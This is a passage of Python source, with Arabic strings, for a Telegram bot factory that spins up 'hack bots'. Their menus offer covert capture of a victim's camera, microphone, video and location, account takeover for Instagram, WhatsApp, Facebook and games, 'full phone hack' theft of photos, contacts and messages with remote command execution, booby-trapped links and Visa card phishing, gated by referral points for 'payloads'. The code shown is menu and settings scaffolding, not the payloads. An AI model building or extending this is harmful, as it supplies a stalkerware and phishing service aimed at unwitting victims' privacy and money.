    "points": {}, # Changed to dict to store points per user {user_id: points}
    "referred_users": [], # Default referred users
    "payload_points_required": 1, # Default payload points required (changed to 1 as per request)
    "custom_buttons": [], # Default for custom buttons
    "custom_buttons_enabled_by_admin": False, # Default to False
    "bot_type": "hack_bot", # Default bot type
    "main_channel_link": None, # Default for encryption bot's main channel
    "paid_users": [], # Ensure paid_users is always initialized
    "parent_factory_admin_id": None, # Default for parent factory admin ID
    "factory_sub_admins": [] # Default for sub-factory admins
}

def get_made_bot_data_path(bot_username):
    return os.path.join(DATABASE_DIR, f"{bot_username}_settings.json")

def load_made_bot_settings(bot_username):
    """تحميل إعدادات البوت المصنوع من ملف JSON."""
    file_path = get_made_bot_data_path(bot_username)
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            settings = json.load(f)
            # Merge with default settings to ensure all keys exist
            made_bot_data[bot_username] = {**DEFAULT_BOT_SETTINGS, **settings}
            # Ensure 'points' is a dictionary
            if not isinstance(made_bot_data[bot_username].get("points"), dict):
                made_bot_data[bot_username]["points"] = {}
            # Ensure 'referred_users' is a list
            if not isinstance(made_bot_data[bot_username].get("referred_users"), list):
                made_bot_data[bot_username]["referred_users"] = []
            # Ensure 'paid_users' is a list
            if not isinstance(made_bot_data[bot_username].get("paid_users"), list):
                made_bot_data[bot_username]["paid_users"] = []
            # Ensure 'factory_sub_admins' is a list
            if not isinstance(made_bot_data[bot_username].get("factory_sub_admins"), list):
                made_bot_data[bot_username]["factory_sub_admins"] = []
    else:
        made_bot_data[bot_username] = DEFAULT_BOT_SETTINGS.copy()
        save_made_bot_settings(bot_username) # Create the file with default settings

def save_made_bot_settings(bot_username):
    """حفظ إعدادات البوت المصنوع إلى ملف JSON."""
    file_path = get_made_bot_data_path(bot_username)
    with open(file_path, 'w') as f:
        json.dump(made_bot_data.get(bot_username, DEFAULT_BOT_SETTINGS), f, indent=4)

def get_bot_admin_id(bot_username):
    """يجلب معرف المسؤول (صانع البوت) لبوت معين."""
    bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(bot_data_file):
        with open(bot_data_file, 'r') as f:
            data = json.load(f)
            return data.get("admin_id")
    return None

def get_bot_type(bot_username):
    """يجلب نوع البوت (hack_bot, encryption_bot, factory_bot) لبوت معين."""
    bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(bot_data_file):
        with open(bot_data_file, 'r') as f:
            data = json.load(f)
            return data.get("bot_type", "hack_bot") # Default to hack_bot for older entries
    return "hack_bot" # Default if file not found

def get_bot_token_from_username(bot_username):
    """يجلب توكن البوت من اسم المستخدم."""
    bot_data_file = os.path.join(DATABASE_DIR, f"{bot_username}.json")
    if os.path.exists(bot_data_file):
        with open(bot_data_file, 'r') as f:
            data = json.load(f)
            return data.get("token")
    return None

def get_bot_username_from_token(bot_token):
    """يجلب اسم المستخدم للبوت من التوكن."""
    try:
        bot_info_resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe").json()
        if bot_info_resp.get("ok"):
            return bot_info_resp["result"]["username"]
    except Exception as e:
        logging.error(f"Error getting bot username for token {bot_token}: {e}")
    return None

def get_admin_keyboard(bot_username, user_id, bot_type):
    """لوحة مفاتيح المسؤول."""
    load_made_bot_settings(bot_username)
    bot_settings = made_bot_data[bot_username]
    
    keyboard = [
        [InlineKeyboardButton("المشتركون 👥", callback_data="m1")],
        [InlineKeyboardButton("إذاعة رسالة 📮", callback_data="send"), InlineKeyboardButton("توجيه رسالة 🔄", callback_data="forward")],
        [InlineKeyboardButton("تعيين اشتراك إجباري 💢", callback_data="ach"), InlineKeyboardButton("حذف اشتراك إجباري 🔱", callback_data="dch")],
        [InlineKeyboardButton("تفعيل التنبيهات ✔️", callback_data="ons"), InlineKeyboardButton("تعطيل التنبيهات ❎", callback_data="ofs")],
        [InlineKeyboardButton("فتح البوت ✅", callback_data="obot"), InlineKeyboardButton("إيقاف البوت ❌", callback_data="ofbot")],
        [InlineKeyboardButton("تعيين وضع مدفوع 💰", callback_data="pro"), InlineKeyboardButton("تعيين وضع مجاني 🆓", callback_data="frre")],
        [InlineKeyboardButton("إضافة عضو مدفوع 💰", callback_data="pro123"), InlineKeyboardButton("إزالة عضو مدفوع 🆓", callback_data="frre123")],
        [InlineKeyboardButton("حظر عضو 🚫", callback_data="ban"), InlineKeyboardButton("إلغاء حظر عضو ❌", callback_data="unban")],
        [InlineKeyboardButton("تغيير رسالة البدء 📝", callback_data="set_start_message")],
        [InlineKeyboardButton("تحميل بيانات البوت 💾", callback_data="download_bot_data")]
    ]

    if bot_type == "hack_bot":
        keyboard.append([InlineKeyboardButton("تعيين نقاط البايلود 🔢", callback_data="set_payload_points")])
        if bot_settings.get("custom_buttons_enabled_by_admin", False):
            keyboard.append([InlineKeyboardButton("قسم الأزرار 🖲️", callback_data="buttons_panel")])
    elif bot_type == "encryption_bot":
        keyboard.append([InlineKeyboardButton("تعيين قناة الأساسية 🫅", callback_data="set_main_channel_link")])
    elif bot_type == "factory_bot": # Admin keyboard for the new factory bot
        keyboard.append([InlineKeyboardButton("✨ أنشئ بوت جديد 🤖", callback_data="create_bot_from_factory")])
        keyboard.append([InlineKeyboardButton("🛠 بوتاتك المصنوعة", callback_data="manage_made_bots_from_factory")])
        keyboard.append([InlineKeyboardButton("➕ إضافة أدمن 👨‍💻", callback_data="add_factory_admin_sub")])
        keyboard.append([InlineKeyboardButton("🗑️ حذف أدمن", callback_data="remove_factory_admin_sub")])
        keyboard.append([InlineKeyboardButton("📊 إحصائيات المصنع الفرعي", callback_data="factory_sub_stats")])
        keyboard.append([InlineKeyboardButton("📢 إذاعة للبوتات المجانية", callback_data="broadcast_free_bots_sub")])
        keyboard.append([InlineKeyboardButton("➕ إضافة مميزات مدفوعة 💎", callback_data="add_paid_features_sub")]) # New button for sub-factory

    return InlineKeyboardMarkup(keyboard)

def get_user_keyboard(admin_id, bot_username, user_id, bot_type):
    """لوحة مفاتيح المستخدم العادي للبوتات المصنوعة."""
    load_made_bot_settings(bot_username)
    bot_settings = made_bot_data[bot_username]

    if bot_type == "hack_bot":
        keyboard = [
            [InlineKeyboardButton("اختراق الكاميرا الخلفية 📸", callback_data="cam_back"),
             InlineKeyboardButton("اختراق الكاميرا الأمامية 📸", callback_data="cam_front")],
            [InlineKeyboardButton("تسجيل صوت الضحية 🎤", callback_data="mic_record"),
             InlineKeyboardButton("اختراق الموقع 📍", callback_data="location")],
            [InlineKeyboardButton("تسجيل فيديو الضحية 🎥", callback_data="record_video"),
             InlineKeyboardButton("اختراق كاميرات المراقبة 📡", callback_data="surveillance_cams")],
            [InlineKeyboardButton("اختراق انستغرام 💻", callback_data="insta_hack"),
             InlineKeyboardButton("اختراق واتساب 🟢", callback_data="whatsapp_hack")],
            [InlineKeyboardButton("اختراق ببجي 🎮", callback_data="pubg_hack"),
             InlineKeyboardButton("اختراق فيسبوك 🟣", callback_data="facebook_hack")],
            [InlineKeyboardButton("اختراق سناب شات ⭐", callback_data="snapchat_hack"),
             InlineKeyboardButton("اختراق فري فاير 👾", callback_data="ff_hack")],
            [InlineKeyboardButton("الذكاء الاصطناعي 🤖", callback_data="user_button_ai"),
             InlineKeyboardButton("تفسير الأحلام 🧙", callback_data="user_button_dream_interpret")],
            [InlineKeyboardButton("لعبة المارد الأزرق 🧞", callback_data="user_button_blue_genie_game"),
             InlineKeyboardButton("البحث عن الصور 🎨", callback_data="user_button_image_search")],
            [InlineKeyboardButton("تحويل النص إلى صوت 🔄", callback_data="user_button_text_to_speech"),
             InlineKeyboardButton("أذكار إسلامية 🕌", callback_data="user_button_azkar")],
            [InlineKeyboardButton("الذكاء الاصطناعي (شيرين) 🎤", callback_data="user_button_shereen_ai"),
             InlineKeyboardButton("الذكاء الاصطناعي (ديب سيك) 🧠", callback_data="user_button_deepseek_ai")],
            [InlineKeyboardButton("الذكاء الاصطناعي (ChatGPT-3.5) 💬", callback_data="user_button_chatgpt_3_5")],
            [InlineKeyboardButton("اختراق تيك توك 🟧", callback_data="tiktok_hack"),
             InlineKeyboardButton("جمع معلومات الجهاز 🔬", callback_data="device_info")],
            [InlineKeyboardButton("اختراق الهاتف بالكامل 🔞", callback_data="user_button_full_phone_hack")],
            [InlineKeyboardButton("تلغيم الروابط ⚠️", callback_data="user_button_link_exploit")],
            [InlineKeyboardButton("لعبة ذكية 🧠", callback_data="user_button_smart_game"),
             InlineKeyboardButton("صور عالية الدقة 🖼️", callback_data="high_quality_shot")],
            [InlineKeyboardButton("أرقام وهمية ☎️", callback_data="user_button_fake_numbers")],
            [InlineKeyboardButton("تصيد فيزا 💳", callback_data="user_button_visa_phishing"),
             InlineKeyboardButton("الحصول على رقم الضحية 📲", callback_data="get_victim_number")],
            [InlineKeyboardButton("اختراق بث الراديو 📻", callback_data="user_button_radio_hack"),
             InlineKeyboardButton("فحص الروابط 🖌️", callback_data="user_button_link_check")],
            [InlineKeyboardButton("زخرفة الأسماء 🗿", callback_data="user_button_name_decorate")],
            [InlineKeyboardButton("صيد يوزرات تليجرام 💍", callback_data="telegram_usernames_menu")],
            [InlineKeyboardButton("تواصل مع المطور 👨‍🎓", url=f"tg://user?id={admin_id}")]
        ]
        # Add custom buttons if enabled by admin
        if bot_settings.get("custom_buttons_enabled_by_admin", False):
            for btn in bot_settings["custom_buttons"]:
                if btn["type"] == "external_link":
                    keyboard.append([InlineKeyboardButton(btn["name"], url=btn["value"])])
                elif btn["type"] == "internal_link":
                    keyboard.append([InlineKeyboardButton(btn["name"], url=btn["value"])])
                elif btn["type"] == "send_message":
                    keyboard.append([InlineKeyboardButton(btn["name"], callback_data=f"custom_msg_btn_{btn['name']}")])
    
    elif bot_type == "encryption_bot":
        keyboard = [
            [InlineKeyboardButton("✥تشفير ملفات🔒", callback_data="encrypt_file")],
            [InlineKeyboardButton("✥فك تشفير ملفات🔓", callback_data="decrypt_file")],
            [InlineKeyboardButton("✥الدعم🚨", url=f"tg://user?id={admin_id}")],
            [InlineKeyboardButton("✥الشروط و المتطلبات📜", callback_data="show_terms_encryption_bot")]
        ]
        if bot_settings.get("main_channel_link"):
            keyboard.append([InlineKeyboardButton("✥القناة الأساسية🫅", url=bot_settings["main_channel_link"])])
        else:
            keyboard.append([InlineKeyboardButton("✥القناة الأساسية🫅", callback_data="no_main_channel_set")])
    
    elif bot_type == "factory_bot": # User keyboard for the new factory bot
        keyboard = [
            [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot_sub")],
            [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot_sub")]
        ]

    return InlineKeyboardMarkup(keyboard)

def get_full_phone_hack_keyboard(bot_username, user_id):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("سحب جميع صور الهاتف🔒", callback_data="full_phone_hack_photos")],
        [InlineKeyboardButton("سحب جميع ارقام الضحية🔒", callback_data="full_phone_hack_contacts")],
        [InlineKeyboardButton("سحب جميع رسائل الضحية🔒", callback_data="full_phone_hack_messages")],
        [InlineKeyboardButton("تنفيذ الأوامر على جهاز الضحية🔒", callback_data="full_phone_hack_commands")],
        [InlineKeyboardButton("اختراق جهاز الضحية🔒", callback_data="full_phone_hack_device")],
        [InlineKeyboardButton("رجوع", callback_data="back_to_main_user_menu")]
    ])

def get_encryption_types_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Base64 🔠", callback_data="enc_type_base64"),
         InlineKeyboardButton("Hex 🔢", callback_data="enc_type_hex")],
        [InlineKeyboardButton("ROT13 🔄", callback_data="enc_type_rot13"),
         InlineKeyboardButton("SHA256 🛡️", callback_data="enc_type_sha256")],
        [InlineKeyboardButton("Gzip 📦", callback_data="enc_type_gzip"),
         InlineKeyboardButton("Reverse ⏪", callback_data="enc_type_reverse")],
        [InlineKeyboardButton("رجوع↩️", callback_data="back_to_main_encryption_menu")]
    ])

def encrypt_data(data: bytes, enc_type: str) -> bytes:
    if enc_type == "base64":
        return base64.b64encode(data)
    elif enc_type == "hex":
        return data.hex().encode('utf-8')
    elif enc_type == "rot13":
        return codecs.encode(data.decode('utf-8', errors='ignore'), 'rot13').encode('utf-8')
    elif enc_type == "sha256":
        return hashlib.sha256(data).hexdigest().encode('utf-8')
    elif enc_type == "gzip":
        import zlib
        return zlib.compress(data)
    elif enc_type == "reverse":
        return data[::-1]
    return b"Error: Unknown encryption type"

def decrypt_data(data: bytes, enc_type: str) -> bytes:
    if enc_type == "base64":
        try:
            return base64.b64decode(data)
        except Exception:
            return b"Error: Invalid Base64 data"
    elif enc_type == "hex":
        try:
            return bytes.fromhex(data.decode('utf-8'))
        except Exception:
            return b"Error: Invalid Hex data"
    elif enc_type == "rot13":
        try:
            return codecs.decode(data.decode('utf-8', errors='ignore'), 'rot13').encode('utf-8')
        except Exception:
            return b"Error: Invalid ROT13 data"
    elif enc_type == "sha256":
        return b"SHA256 is a one-way hash, cannot be decrypted."
    elif enc_type == "gzip":
        import zlib
        try:
            return zlib.decompress(data)
        except Exception:
            return b"Error: Invalid Gzip data"
    elif enc_type == "reverse":
        return data[::-1]
    return b"Error: Unknown decryption type"


def start_made_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)
    
    if not current_bot_username:
        logging.error(f"لم يتمكن من الحصول على اسم المستخدم للبوت بالتوكن {current_bot_token}. لا يمكن المتابعة.")
        send_message(context.bot, chat_id, "حدث خطأ في تحديد هوية البوت. يرجى المحاولة لاحقًا.")
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)

    # تحميل بيانات البوت
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data.get(current_bot_username, DEFAULT_BOT_SETTINGS)

    # تهيئة حالة المستخدم إذا لم تكن موجودة
    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None # Reset state on /start

    # تحديث وقت آخر تفاعل
    if current_bot_username not in user_last_interaction_time:
        user_last_interaction_time[current_bot_username] = {}
    user_last_interaction_time[current_bot_username][user_id] = time.time()

    # التحقق من الحظر
    if user_id in bot_settings["banned_users"]:
        send_message(context.bot, chat_id, "أنت محظور من قبل المطور لا يمكنك استخدام البوت📛")
        return

    # التحقق من حالة البوت (مفتوح/مغلق)
    if bot_settings["bot_status"] == "off" and user_id != admin_id:
        send_message(context.bot, chat_id, "البوت متوقف حاليا لأغراض خاصة 🚨🚧")
        return

    # التحقق من وضع المدفوع
    if bot_settings["payment_status"] == "on" and user_id not in bot_settings["paid_users"] and user_id != admin_id:
        send_message(context.bot, chat_id,
                     "مرحبًا بكم! 🌟\n\nللاستفادة الكاملة من جميع ميزات وخدمات بوتنا المتقدمة، يُرجى تفعيل البوت من خلال شراء الاشتراك. ⚙️✨\n\nنحن نعمل بجد لضمان تقديم تجربة فريدة ومميزة لكم. 🚀\n\nشكراً لثقتكم بنا. 😊",
                     reply_markup=InlineKeyboardMarkup([
                         [InlineKeyboardButton("شراء الاشتراك", url=f"tg://user?id={admin_id}")]
                     ]))
        return

    # NEW: التحقق من الاشتراك الإجباري لقناة المصنع الأساسية (إذا كانت مفعلة)
    # هذا التحقق يتم دائمًا بواسطة توكن البوت الرئيسي لضمان الصلاحية
    if FACTORY_MAIN_SUBSCRIPTION_ENABLED:
        if not check_subscription(user_id, [FACTORY_MAIN_SUBSCRIPTION_CHANNEL], MAIN_BOT_TOKEN):
            msg = f"❌ يجب عليك الاشتراك في القناة الأساسية {FACTORY_MAIN_SUBSCRIPTION_CHANNEL} لاستخدام هذا البوت.\n"
            keyboard = [[InlineKeyboardButton("اشترك في القناة", url=f"https://t.me/{FACTORY_MAIN_SUBSCRIPTION_CHANNEL.lstrip('@')}")]]
            send_message(context.bot, chat_id, msg, reply_markup=InlineKeyboardMarkup(keyboard))
            # تخزين حالة المستخدم بأنه ينتظر الاشتراك في قناة المصنع الأساسية
            bot_user_states[current_bot_username][user_id] = {"awaiting_factory_main_subscription": True}
            return
    
    # إذا كان المستخدم قد أكمل الاشتراك في قناة المصنع الأساسية (إذا كانت مفعلة)
    # أو إذا لم تكن مفعلة، نتحقق من قنوات البوت المصنوع
    # وإذا كان المستخدم في حالة انتظار الاشتراك في قناة المصنع الأساسية، نقوم بإزالة هذه الحالة
    if isinstance(bot_user_states[current_bot_username].get(user_id), dict) and bot_user_states[current_bot_username][user_id].get("awaiting_factory_main_subscription"):
        bot_user_states[current_bot_username][user_id] = None # إزالة حالة الانتظار

    # Handle referral link (only for hack_bot)
    if bot_type == "hack_bot" and context.args and len(context.args) == 1:
        referrer_id = context.args[0]
        try:
            referrer_id = int(referrer_id)
            if referrer_id != user_id: # User cannot refer themselves
                # التحقق من الاشتراك في جميع القنوات المطلوبة قبل احتساب النقطة
                # بما في ذلك قناة المصنع الأساسية إذا كانت مفعلة
                all_required_channels = list(set(bot_settings["channels"] + ([FACTORY_MAIN_SUBSCRIPTION_CHANNEL] if FACTORY_MAIN_SUBSCRIPTION_ENABLED else [])))
                not_subscribed_channels = []
                for channel in all_required_channels:
                    # استخدام توكن المصنع الأساسي للتحقق من قناة المصنع الأساسية
                    if channel == FACTORY_MAIN_SUBSCRIPTION_CHANNEL:
                        if not check_subscription(user_id, [channel], MAIN_BOT_TOKEN):
                            not_subscribed_channels.append(channel)
                    else:
                        if not check_subscription(user_id, [channel], current_bot_token):
                            not_subscribed_channels.append(channel)

                if not_subscribed_channels:
                    message_text = "🚀🎨 مرحباً بك في عالم إنشاء وإدارة الأندكسات🎨🚀\n\n📌 تنبيه: الاشتراك الإجباري 📌\n\n🔐 لضمان أفضل تجربة واستخدام كامل لميزات البوت، يُرجى الاشتراك في القنوات التالية:\n\n🌟📈 استعد للانطلاق في رحلة تفاعلية مذهلة! 📈🌟\n\n"
                    keyboard = []
                    for channel in not_subscribed_channels:
                        channel_name = get_channel_name(channel, current_bot_token)
                        clean_channel = channel.lstrip('@')
                        keyboard.append([InlineKeyboardButton(f"اشترك في {channel_name}", url=f"https://t.me/{clean_channel}")])
                        message_text += f"{channel_name}\n"
                    
                    message_text += "\n📢 بعد إتمام الاشتراك، قم بإرسال رسالة \"/start\" للمتابعة واستغلال جميع خدمات البوت.\n\n💬 نتمنى لك تجربة رائعة ومليئة بالتفاعل! 💬"
                    
                    send_message(context.bot, chat_id, message_text, reply_markup=InlineKeyboardMarkup(keyboard))
                    bot_user_states[current_bot_username][user_id] = {"awaiting_subscription_for_referral": referrer_id}
                    return
                else:
                    # إذا كان المستخدم مشتركًا بالفعل أو أكمل الاشتراك، يتم احتساب النقطة
                    load_made_bot_settings(current_bot_username)
                    if not isinstance(made_bot_data[current_bot_username].get("points"), dict):
                        made_bot_data[current_bot_username]["points"] = {}
                    
                    # تحقق مما إذا كان المستخدم قد أحيل بالفعل
                    if user_id not in made_bot_data[current_bot_username]["referred_users"]:
                        made_bot_data[current_bot_username]["points"][referrer_id] = made_bot_data[current_bot_username]["points"].get(referrer_id, 0) + 1
                        made_bot_data[current_bot_username]["referred_users"].append(user_id)
                        save_made_bot_settings(current_bot_username)
                        
                        new_user_name = update.effective_user.first_name
                        send_message(context.bot, referrer_id, f"✅ تم احتساب نقطة بنجاح من دخول المستخدم {new_user_name} إلى رابطك. نقاطك الحالية: {made_bot_data[current_bot_username]['points'][referrer_id]} 🌟")
                        logging.info(f"User {user_id} referred by {referrer_id}. Points for {referrer_id}: {made_bot_data[current_bot_username]['points'][referrer_id]}")
                    else:
                        send_message(context.bot, chat_id, "لم يتم احتساب النقاط لأنك قمت بالدخول عبر رابط إحالة من قبل. ℹ️")
                
            else:
                send_message(context.bot, chat_id, "لا يمكنك احتساب نقاط لنفسك. 😅")
        except ValueError:
            logging.warning(f"تم استلام معرف محيل غير صالح: {context.args[0]}")

    # التحقق من الاشتراك الإجباري (القنوات الخاصة بالبوت المصنوع)
    required_channels = bot_settings["channels"]
    # إزالة قناة المصنع الأساسية من هذا الفحص إذا كانت موجودة، لأنها تم فحصها بالفعل
    if FACTORY_MAIN_SUBSCRIPTION_CHANNEL in required_channels:
        required_channels = [c for c in required_channels if c != FACTORY_MAIN_SUBSCRIPTION_CHANNEL]

    if required_channels:
        not_subscribed_channels = []
        for channel in required_channels:
            if not check_subscription(user_id, [channel], current_bot_token):
                not_subscribed_channels.append(channel)

        if not_subscribed_channels:
            message_text = "🚀🎨 مرحباً بك في عالم إنشاء وإدارة الأندكسات🎨🚀\n\n📌 تنبيه: الاشتراك الإجباري 📌\n\n🔐 لضمان أفضل تجربة واستخدام كامل لميزات البوت، يُرجى الاشتراك في القنوات التالية:\n\n🌟📈 استعد للانطلاق في رحلة تفاعلية مذهلة! 📈🌟\n\n"
            keyboard = []
            for channel in not_subscribed_channels:
                channel_name = get_channel_name(channel, current_bot_token)
                clean_channel = channel.lstrip('@')
                keyboard.append([InlineKeyboardButton(f"اشترك في {channel_name}", url=f"https://t.me/{clean_channel}")])
                message_text += f"{channel_name}\n"
            
            message_text += "\n📢 بعد إتمام الاشتراك، قم بإرسال رسالة \"/start\" للمتابعة واستغلال جميع خدمات البوت.\n\n💬 نتمنى لك تجربة رائعة ومليئة بالتفاعل! 💬"
            
            send_message(context.bot, chat_id, message_text, reply_markup=InlineKeyboardMarkup(keyboard))
            return
    
    # تسجيل المستخدم الجديد (بعد التحقق من الاشتراك الإجباري)
    members = bot_settings["members"]
    if user_id not in members:
        members.append(user_id)
        bot_settings["members"] = members # Update in settings dict
        save_made_bot_settings(current_bot_username) # Save updated members
        
        if bot_settings["notifications"] == "on" and user_id != admin_id:
            user_name = update.effective_user.first_name
            username = update.effective_user.username
            member_count = len(members)
            send_message(context.bot, admin_id,
                         f"🔔 *تنبيه: مستخدم جديد انضم إلى البوت الخاص بك!* 🎉\n👨‍💼¦ اسمه » ️ [{user_name}]\n🔱¦ معرفه »  ️[@{username}]\n💳¦ ايديه » ️ [{user_id}]\n📊 *عدد الأعضاء الكلي:* {member_count}",
                         parse_mode=ParseMode.MARKDOWN)

    if user_id == admin_id:
        send_message(context.bot, chat_id,
                     "مرحبًا! إليك أوامرك: ⚡📮\n\n1. إدارة المشترڪين والتحكم بهم. 👥\n2. إرسال إذاعات ورسائل موجهة. 📢\n3. ضبط إعدادات الاشتراك الإجباري. 💢\n4. تفعيل أو تعطيل التنبيهات. ✔️❎\n5. إدارة حالة البوت ووضع الاشتراك. 💰🆓",
                     reply_markup=get_admin_keyboard(current_bot_username, user_id, bot_type))
        
        # Send user keyboard as well for admin
        if bot_type == "encryption_bot":
            user_name = update.effective_user.first_name
            user_username = update.effective_user.username if update.effective_user.username else "غير متاح"
            welcome_message = (
                f"مرحباً {user_name}! 👋\n"
                f"يوزر: @{user_username}\n"
                f"ايدي: {user_id}\n\n"
                f"تم مرحبا بك في عالم فك/التشفير 🔐 ✅"
            )
            send_message(context.bot, chat_id, welcome_message, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        elif bot_type == "factory_bot":
            send_message(context.bot, chat_id,
                         "👋 حياك الله في بوت صانع البوتات اختر نوع البوت الذي تريد انشاءه 🎩",
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        else: # hack_bot
            send_message(context.bot, chat_id,
                         bot_settings["start_message"],
                         parse_mode=ParseMode.MARKDOWN,
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
    else:
        if bot_type == "encryption_bot":
            user_name = update.effective_user.first_name
            user_username = update.effective_user.username if update.effective_user.username else "غير متاح"
            welcome_message = (
                f"مرحباً {user_name}! 👋\n"
                f"يوزر: @{user_username}\n"
                f"ايدي: {user_id}\n\n"
                f"تم مرحبا بك في عالم فك/التشفير 🔐 ✅"
            )
            send_message(context.bot, chat_id, welcome_message, reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        elif bot_type == "factory_bot":
            send_message(context.bot, chat_id,
                         "👋 حياك الله في بوت صانع البوتات اختر نوع البوت الذي تريد انشاءه 🎩",
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
        else: # hack_bot
            send_message(context.bot, chat_id,
                         bot_settings["start_message"],
                         parse_mode=ParseMode.MARKDOWN,
                         reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))

def check_username_availability(bot_token, username):
    """
    يتحقق مما إذا كان اسم المستخدم متاحًا على Telegram.
    يعيد True إذا كان متاحًا (لا يوجد مستخدم/قناة/مجموعة بهذا الاسم)، False إذا كان غير متاح.
    """
    try:
        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getChat?chat_id=@{username}").json()
        if resp.get("ok"):
            return False
        elif resp.get("error_code") == 400 and "chat not found" in resp.get("description", "").lower():
            return True
        else:
            logging.warning(f"استجابة غير متوقعة للتحقق من اسم المستخدم {username}: {resp}")
            return False
    except Exception as e:
        logging.error(f"خطأ في التحقق من توفر اسم المستخدم لـ @{username}: {e}")
        return False

def generate_and_check_username(bot_token, username_type):
    """
    ينشئ اسم مستخدم بناءً على النوع المحدد ويتحقق من توفره.
    يعيد اسم المستخدم إذا كان متاحًا، وإلا يعيد None.
    """
    chars = string.ascii_lowercase + string.digits
    
    for _ in range(50):
        username = ""
        if username_type == "single_type":
            if random.choice([True, False]):
                char = random.choice(string.ascii_lowercase)
                username = char * 4
            else:
                for _ in range(4):
                    username += random.choice(string.ascii_lowercase + string.digits)
        elif username_type == "quad_usernames":
            username = ''.join(random.choice(chars) for _ in range(4))
        elif username_type == "semi_quad":
            parts = [random.choice(chars) for _ in range(3)]
            username = f"{parts[0]}{parts[1]}_{parts[2]}" if random.choice([True, False]) else f"{parts[0]}_{parts[1]}{parts[2]}"
        elif username_type == "semi_triple":
            parts = [random.choice(chars) for _ in range(2)]
            username = f"{parts[0]}_{parts[1]}"
        elif username_type == "random":
            length = random.randint(4, 8)
            username = ''.join(random.choice(chars) for _ in range(length))
        elif username_type == "unique":
            patterns = [
                lambda: ''.join(random.choice(string.ascii_lowercase) for _ in range(4)),
                lambda: ''.join(random.choice(string.digits) for _ in range(4)),
                lambda: random.choice(string.ascii_lowercase) * 3 + random.choice(string.digits),
                lambda: random.choice(string.ascii_lowercase) + random.choice(string.digits) * 3,
                lambda: random.choice(string.ascii_lowercase) + random.choice(string.ascii_lowercase) + random.choice(string.digits) + random.choice(string.digits),
                lambda: random.choice(string.ascii_lowercase) + random.choice(string.digits) + random.choice(string.ascii_lowercase) + random.choice(string.digits),
            ]
            username = random.choice(patterns)()

        if check_username_availability(bot_token, username):
            return username
        time.sleep(0.1)
    return None

def telegram_usernames_menu(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    current_bot_username = get_bot_username_from_token(context.bot.token)
    bot_type = get_bot_type(current_bot_username)

    keyboard = [
        [InlineKeyboardButton("يوزر نوع واحد 🅰️", callback_data="get_username_single_type")],
        [InlineKeyboardButton("يوزرات رباعية 🔢", callback_data="get_username_quad_usernames")],
        [InlineKeyboardButton("شبه رباعي 🔠", callback_data="get_username_semi_quad")],
        [InlineKeyboardButton("يوزرات شبه ثلاثية 🔡", callback_data="get_username_semi_triple")],
        [InlineKeyboardButton("عشوائي 🎲", callback_data="get_username_random")],
        [InlineKeyboardButton("فريد ✨", callback_data="get_username_unique")],
        [InlineKeyboardButton("رجوع 🔙", callback_data="back_to_main_user_menu")]
    ]
    edit_message_text(context.bot, query.message.chat.id, query.message.message_id,
                      "اختر نوع اليوزر الذي تبحث عنه: 👇", reply_markup=InlineKeyboardMarkup(keyboard))

def handle_username_type_selection(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)
    bot_type = get_bot_type(current_bot_username)

    query.answer("جاري البحث عن يوزرات متاحة... ⏳", show_alert=True)
    
    chat_id = query.message.chat.id
    username_type = query.data.replace("get_username_", "")
    

    found_usernames = []
    for i in range(5):
        username = generate_and_check_username(current_bot_token, username_type)
        if username:
            found_usernames.append(username)
        else:
            if i == 0 and not found_usernames:
                send_message(context.bot, chat_id, "لم يتم العثور على يوزرات متاحة حاليًا لهذا النوع. حاول مرة أخرى لاحقًا. 😔")
                return
            break

    if found_usernames:
        response_message = "✅ تم العثور على اليوزرات التالية:\n\n"
        for username in found_usernames:
            response_message += f"✨ @{username}\n"
        send_message(context.bot, chat_id, response_message)
    else:
        send_message(context.bot, chat_id, "لم يتم العثور على يوزرات متاحة حاليًا لهذا النوع. حاول مرة أخرى لاحقًا. 😔")

def check_api_status(api_url, params=None):
    """يتحقق مما إذا كان الـ API يعمل."""
    try:
        response = requests.head(api_url, params=params, timeout=5)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        logging.error(f"فشل التحقق من API لـ {api_url}: {e}")
        return False

def interact_with_ai_api(prompt, api_type, bot_username, user_id):
    """
    يتفاعل مع APIs الذكاء الاصطناعي بناءً على نوع الطلب.
    يستخدم APIs بديلة في حال فشل الأساسي.
    """
    apis_to_try = []
    if api_type == "ai":
        apis_to_try = [
            (API_AI_PRIMARY, {"q": prompt}),
            (API_CHATGPT_3_5, {"ai": prompt}),
            (API_DEEPSEEK_AI, {"q": prompt}),
            (API_SHEREEN_AI, {"q": prompt}),
            (API_AI_FALLBACK_1, {"gpt-5-mini": prompt}),
            (API_AI_FALLBACK_2, {"WR1": prompt}),
            (API_AI_FALLBACK_3, {"text": prompt}),
        ]
    elif api_type == "dream_interpret":
        apis_to_try = [
            (API_AI_PRIMARY, {"q": f"تفسير الحلم: {prompt}"}),
